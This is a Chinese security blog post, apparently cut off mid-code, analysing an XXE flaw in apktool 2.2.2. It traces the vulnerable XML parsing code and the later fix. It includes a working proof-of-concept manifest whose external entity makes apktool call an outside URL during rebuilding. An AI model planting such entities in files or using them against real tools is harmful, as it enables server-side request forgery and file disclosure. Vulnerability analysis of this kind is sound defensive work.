@@ -1,0 +1,1111 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Android," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00 分析环境apktool 版本：2.2.2  https://connortumbleson.com/2017/01/23/apktool-v2-2-2-released/ 参考链接：https://security.tencent.com/index.php/blog/msg/122 0x01 XXE漏洞利用分析原理：Apktool在解析AndroidManifest.xml文件时，没有">
+<meta name="keywords" content="Android">
+<meta property="og:type" content="article">
+<meta property="og:title" content="apktool漏洞利用分析">
+<meta property="og:url" content="http://yoursite.com/2018/03/17/apktool漏洞利用分析/index.html">
+<meta property="og:site_name" content="Mask&#39;s Blog">
+<meta property="og:description" content="0x00 分析环境apktool 版本：2.2.2  https://connortumbleson.com/2017/01/23/apktool-v2-2-2-released/ 参考链接：https://security.tencent.com/index.php/blog/msg/122 0x01 XXE漏洞利用分析原理：Apktool在解析AndroidManifest.xml文件时，没有">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2018/03/17/apktool漏洞利用分析/0.png">
+<meta property="og:image" content="http://yoursite.com/2018/03/17/apktool漏洞利用分析/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/03/17/apktool漏洞利用分析/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/03/17/apktool漏洞利用分析/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/03/17/apktool漏洞利用分析/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/03/17/apktool漏洞利用分析/5.png">
+<meta property="og:updated_time" content="2018-03-17T12:20:21.220Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="apktool漏洞利用分析">
+<meta name="twitter:description" content="0x00 分析环境apktool 版本：2.2.2  https://connortumbleson.com/2017/01/23/apktool-v2-2-2-released/ 参考链接：https://security.tencent.com/index.php/blog/msg/122 0x01 XXE漏洞利用分析原理：Apktool在解析AndroidManifest.xml文件时，没有">
+<meta name="twitter:image" content="http://yoursite.com/2018/03/17/apktool漏洞利用分析/0.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/17/apktool漏洞利用分析/"/>
+
+
+
+
+
+  <title>apktool漏洞利用分析 | Mask's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Mask's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/17/apktool漏洞利用分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Mask">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mask's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">apktool漏洞利用分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-17T19:29:43+08:00">
+                2018-03-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-分析环境"><a href="#0x00-分析环境" class="headerlink" title="0x00 分析环境"></a>0x00 分析环境</h2><p>apktool 版本：2.2.2  <a href="https://connortumbleson.com/2017/01/23/apktool-v2-2-2-released/" target="_blank" rel="noopener">https://connortumbleson.com/2017/01/23/apktool-v2-2-2-released/</a></p>
+<p>参考链接：<a href="https://security.tencent.com/index.php/blog/msg/122" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/122</a></p>
+<h2 id="0x01-XXE漏洞利用分析"><a href="#0x01-XXE漏洞利用分析" class="headerlink" title="0x01 XXE漏洞利用分析"></a>0x01 XXE漏洞利用分析</h2><p>原理：Apktool在解析AndroidManifest.xml文件时，没有禁用外部实体，导致了外部实体注入攻击漏洞</p>
+<a id="more"></a>
+<p>利用过程：</p>
+<p>首先创建一个简单的APK，利用apktool反编译：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/AndroidXXE$ java -jar apktool_2.2.2.jar d app-release.apk -o xxe</span><br><span class="line">I: Using Apktool 2.2.2 on app-release.apk</span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding AndroidManifest.xml with resources...</span><br><span class="line">I: Loading resource table from file: /home/mask/.local/share/apktool/framework/1.apk</span><br><span class="line">I: Regular manifest package...</span><br><span class="line">I: Decoding file-resources...</span><br><span class="line">I: Decoding values */* XMLs...</span><br><span class="line">I: null reference: m1=0x01010540(reference), m2=0xffffffff(bool)</span><br><span class="line">I: Baksmaling classes.dex...</span><br><span class="line">I: Copying assets and libs...</span><br><span class="line">I: Copying unknown files...</span><br><span class="line">I: Copying original files...</span><br></pre></td></tr></table></figure>
+<p>反编译后,进入xxe文件夹修改AndroidManifest.xml:</p>
+<p>原文件：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;test.mask.com.apk&quot; platformBuildVersionCode=&quot;26&quot; platformBuildVersionName=&quot;8.0.0&quot;&gt;</span><br><span class="line">&lt;meta-data android:name=&quot;android.support.VERSION&quot; android:value=&quot;26.0.0-alpha1&quot;/&gt;</span><br><span class="line">&lt;application android:allowBackup=&quot;true&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot; android:supportsRtl=&quot;true&quot; android:theme=&quot;@style/AppTheme&quot;&gt;</span><br><span class="line">&lt;activity android:name=&quot;test.mask.com.apk.MainActivity&quot;&gt;</span><br><span class="line">&lt;intent-filter&gt;</span><br><span class="line">&lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;</span><br><span class="line">&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;</span><br><span class="line">&lt;/intent-filter&gt;</span><br><span class="line">&lt;/activity&gt;</span><br><span class="line">&lt;/application&gt;</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure>
+<p>​    </p>
+<p>修改成：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE manifest [&lt;!ENTITY xxe SYSTEM &apos;https://www.52pojie.cn/;&apos;&gt;]&gt;</span><br><span class="line"> &amp;xxe;</span><br><span class="line">&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;test.mask.com.apk&quot; platformBuildVersionCode=&quot;26&quot; platformBuildVersionName=&quot;8.0.0&quot;&gt;</span><br><span class="line">&lt;meta-data android:name=&quot;android.support.VERSION&quot; android:value=&quot;26.0.0-alpha1&quot;/&gt;</span><br><span class="line">&lt;application android:allowBackup=&quot;true&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot; android:supportsRtl=&quot;true&quot; android:theme=&quot;@style/AppTheme&quot;&gt;</span><br><span class="line">&lt;activity android:name=&quot;test.mask.com.apk.MainActivity&quot;&gt;</span><br><span class="line">&lt;intent-filter&gt;</span><br><span class="line">&lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;</span><br><span class="line">&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;</span><br><span class="line">&lt;/intent-filter&gt;</span><br><span class="line">&lt;/activity&gt;</span><br><span class="line">&lt;/application&gt;</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure>
+<p>然后保存，再使用apktool进行重打包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/AndroidXXE$ java -jar apktool_2.2.2.jar b xxe/ -o xxe.apk</span><br><span class="line">I: Using Apktool 2.2.2</span><br><span class="line">I: Checking whether sources has changed...</span><br><span class="line">I: Smaling smali folder into classes.dex...</span><br><span class="line">I: Checking whether resources has changed...</span><br><span class="line">I: Building resources...</span><br><span class="line">I: Building apk file...</span><br><span class="line">I: Copying unknown files/dir...</span><br></pre></td></tr></table></figure>
+<p>捕捉到了流量，那么确实是访问了</p>
+<img src="/2018/03/17/apktool漏洞利用分析/0.png">
+<p>源码分析：</p>
+<p>首先分析Main.java</p>
+<img src="/2018/03/17/apktool漏洞利用分析/1.png">
+<p>这里接受传入的参数，<code>d</code>单表反编译，<code>b</code>代表重打包，因为这个漏洞是在重打包时触发的，那么我们就跟进<code>cmdBuild()</code>这个函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">private static void cmdBuild(final CommandLine cli) throws BrutException &#123;</span><br><span class="line">    final String[] args = cli.getArgs();</span><br><span class="line">    final String appDirName = (args.length &lt; 2) ? &quot;.&quot; : args[1];</span><br><span class="line">    File outFile = null;</span><br><span class="line">    final ApkOptions apkOptions = new ApkOptions();</span><br><span class="line">    if (cli.hasOption(&quot;f&quot;) || cli.hasOption(&quot;force-all&quot;)) &#123;</span><br><span class="line">        apkOptions.forceBuildAll = true;</span><br><span class="line">    &#125;</span><br><span class="line">    if (cli.hasOption(&quot;d&quot;) || cli.hasOption(&quot;debug&quot;)) &#123;</span><br><span class="line">        System.out.println(&quot;SmaliDebugging has been removed in 2.1.0 onward. Please see: https://github.com/iBotPeaches/Apktool/issues/1061&quot;);</span><br><span class="line">        apkOptions.debugMode = true;</span><br><span class="line">    &#125;</span><br><span class="line">    if (cli.hasOption(&quot;v&quot;) || cli.hasOption(&quot;verbose&quot;)) &#123;</span><br><span class="line">        apkOptions.verbose = true;</span><br><span class="line">    &#125;</span><br><span class="line">    if (cli.hasOption(&quot;a&quot;) || cli.hasOption(&quot;aapt&quot;)) &#123;</span><br><span class="line">        apkOptions.aaptPath = cli.getOptionValue(&quot;a&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (cli.hasOption(&quot;c&quot;) || cli.hasOption(&quot;copy-original&quot;)) &#123;</span><br><span class="line">        apkOptions.copyOriginalFiles = true;</span><br><span class="line">    &#125;</span><br><span class="line">    if (cli.hasOption(&quot;p&quot;) || cli.hasOption(&quot;frame-path&quot;)) &#123;</span><br><span class="line">        apkOptions.frameworkFolderLocation = cli.getOptionValue(&quot;p&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (cli.hasOption(&quot;o&quot;) || cli.hasOption(&quot;output&quot;)) &#123;</span><br><span class="line">        outFile = new File(cli.getOptionValue(&quot;o&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        outFile = null;</span><br><span class="line">    &#125;</span><br><span class="line">    new Androlib(apkOptions).build(new File(appDirName), outFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>前面一大堆都不重要，就是一些参数选项，最后一句开始build apk,那么我们跟进这个<code>build</code>函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public void build(File appDir, File outFile) throws BrutException &#123;</span><br><span class="line">	build(new ExtFile(appDir), outFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>继续跟进：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">public void build(final ExtFile appDir, File outFile) throws BrutException &#123;</span><br><span class="line">	Androlib.LOGGER.info(&quot;Using Apktool &quot; + getVersion());</span><br><span class="line">	final MetaInfo meta = this.readMetaFile(appDir);</span><br><span class="line">	this.apkOptions.isFramework = meta.isFrameworkApk;</span><br><span class="line">	this.apkOptions.resourcesAreCompressed = meta.compressionType;</span><br><span class="line">	this.apkOptions.doNotCompress = meta.doNotCompress;</span><br><span class="line">	this.mAndRes.setSdkInfo(meta.sdkInfo);</span><br><span class="line">	this.mAndRes.setPackageId(meta.packageInfo);</span><br><span class="line">	this.mAndRes.setPackageRenamed(meta.packageInfo);</span><br><span class="line">	this.mAndRes.setVersionInfo(meta.versionInfo);</span><br><span class="line">	this.mAndRes.setSharedLibrary(meta.sharedLibrary);</span><br><span class="line">	if (meta.sdkInfo != null &amp;&amp; meta.sdkInfo.get(&quot;minSdkVersion&quot;) != null) &#123;</span><br><span class="line">		this.mMinSdkVersion = Integer.parseInt(meta.sdkInfo.get(&quot;minSdkVersion&quot;));</span><br><span class="line">	&#125;</span><br><span class="line">	if (outFile == null) &#123;</span><br><span class="line">		final String outFileName = meta.apkFileName;</span><br><span class="line">		outFile = new File(appDir, &quot;dist&quot; + File.separator + ((outFileName == null) ? &quot;out.apk&quot; : outFileName));</span><br><span class="line">	&#125;</span><br><span class="line">	new File(appDir, &quot;build/apk&quot;).mkdirs();</span><br><span class="line">	this.buildSources(appDir);</span><br><span class="line">	this.buildNonDefaultSources(appDir);</span><br><span class="line">	final File manifest = new File(appDir, &quot;AndroidManifest.xml&quot;);</span><br><span class="line">	final File manifestOriginal = new File(appDir, &quot;AndroidManifest.xml.orig&quot;);</span><br><span class="line">	if (manifest.isFile() &amp;&amp; manifest.exists()) &#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			if (manifestOriginal.exists()) &#123;</span><br><span class="line">				manifestOriginal.delete();</span><br><span class="line">			&#125;</span><br><span class="line">		FileUtils.copyFile(manifest, manifestOriginal);</span><br><span class="line">		ResXmlPatcher.fixingPublicAttrsInProviderAttributes(manifest);</span><br><span class="line">		&#125;</span><br><span class="line">		catch (IOException ex) &#123;</span><br><span class="line">			throw new AndrolibException(ex.getMessage());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	this.buildResources(appDir, meta.usesFramework);</span><br><span class="line">	this.buildLib(appDir);</span><br><span class="line">	this.buildLibs(appDir);</span><br><span class="line">	this.buildCopyOriginalFiles(appDir);</span><br><span class="line">	this.buildApk(appDir, outFile);</span><br><span class="line">	this.buildUnknownFiles(appDir, outFile, meta);</span><br><span class="line">	if (manifest.isFile() &amp;&amp; manifest.exists()) &#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			if (new File(appDir, &quot;AndroidManifest.xml&quot;).delete()) &#123;</span><br><span class="line">				FileUtils.moveFile(manifestOriginal, manifest);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		catch (IOException ex) &#123;</span><br><span class="line">			throw new AndrolibException(ex.getMessage());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>前面一大堆不用看，直接看操作AndroidManifest.xml的地方，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ResXmlPatcher.fixingPublicAttrsInProviderAttributes(manifest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>继续跟进：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">public static void fixingPublicAttrsInProviderAttributes(final File file) throws AndrolibException &#123;</span><br><span class="line">    boolean saved = false;</span><br><span class="line">    if (file.exists()) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            final Document doc = loadDocument(file);</span><br><span class="line">            XPath xPath = XPathFactory.newInstance().newXPath();</span><br><span class="line">            XPathExpression expression = xPath.compile(&quot;/manifest/application/provider&quot;);</span><br><span class="line">            Object result = expression.evaluate(doc, XPathConstants.NODESET);</span><br><span class="line">            NodeList nodes = (NodeList)result;</span><br><span class="line">            for (int i = 0; i &lt; nodes.getLength(); ++i) &#123;</span><br><span class="line">                final Node node = nodes.item(i);</span><br><span class="line">                final NamedNodeMap attrs = node.getAttributes();</span><br><span class="line">                if (attrs != null) &#123;</span><br><span class="line">                    final Node provider = attrs.getNamedItem(&quot;android:authorities&quot;);</span><br><span class="line">                    if (provider != null) &#123;</span><br><span class="line">                        final String reference = provider.getNodeValue();</span><br><span class="line">                        final String replacement = pullValueFromStrings(file.getParentFile(), reference);</span><br><span class="line">                        if (replacement != null) &#123;</span><br><span class="line">                            provider.setNodeValue(replacement);</span><br><span class="line">                            saved = true;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            xPath = XPathFactory.newInstance().newXPath();</span><br><span class="line">            expression = xPath.compile(&quot;/manifest/application/activity/intent-filter/data&quot;);</span><br><span class="line">            result = expression.evaluate(doc, XPathConstants.NODESET);</span><br><span class="line">            nodes = (NodeList)result;</span><br><span class="line">            for (int i = 0; i &lt; nodes.getLength(); ++i) &#123;</span><br><span class="line">                final Node node = nodes.item(i);</span><br><span class="line">                final NamedNodeMap attrs = node.getAttributes();</span><br><span class="line">                if (attrs != null) &#123;</span><br><span class="line">                    final Node provider = attrs.getNamedItem(&quot;android:scheme&quot;);</span><br><span class="line">                    if (provider != null) &#123;</span><br><span class="line">                        final String reference = provider.getNodeValue();</span><br><span class="line">                        final String replacement = pullValueFromStrings(file.getParentFile(), reference);</span><br><span class="line">                        if (replacement != null) &#123;</span><br><span class="line">                            provider.setNodeValue(replacement);</span><br><span class="line">                            saved = true;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (saved) &#123;</span><br><span class="line">                saveDocument(file, doc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch (SAXException ex) &#123;&#125;</span><br><span class="line">        catch (ParserConfigurationException ex2) &#123;&#125;</span><br><span class="line">        catch (IOException ex3) &#123;&#125;</span><br><span class="line">        catch (XPathExpressionException ex4) &#123;&#125;</span><br><span class="line">        catch (TransformerException ex5) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里对文件进行了处理：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">final Document doc = loadDocument(file)</span><br></pre></td></tr></table></figure>
+<p>再跟进：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private static Document loadDocument(final File file) throws IOException, SAXException, ParserConfigurationException &#123;</span><br><span class="line">    final DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">    final DocumentBuilder docBuilder = docFactory.newDocumentBuilder();</span><br><span class="line">    return docBuilder.parse(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以发现此处就是直接对AndroidManifest.xml文件进行解析，并没有禁用外部实体，那么来看看作者是怎样修复的</p>
+<img src="/2018/03/17/apktool漏洞利用分析/2.png">
+<p>加入了禁用外部实体然后再解析：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * @param file File to load into Document</span><br><span class="line"> * @return Document</span><br><span class="line"> * @throws IOException</span><br><span class="line"> * @throws SAXException</span><br><span class="line"> * @throws ParserConfigurationException</span><br><span class="line"> */</span><br><span class="line">private static Document loadDocument(File file)</span><br><span class="line">        throws IOException, SAXException, ParserConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">    docFactory.setFeature(FEATURE_DISABLE_DOCTYPE_DECL, true);</span><br><span class="line">    docFactory.setFeature(FEATURE_LOAD_DTD, false);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        docFactory.setAttribute(ACCESS_EXTERNAL_DTD, &quot; &quot;);</span><br><span class="line">        docFactory.setAttribute(ACCESS_EXTERNAL_SCHEMA, &quot; &quot;);</span><br><span class="line">    &#125; catch (IllegalArgumentException ex) &#123;</span><br><span class="line">        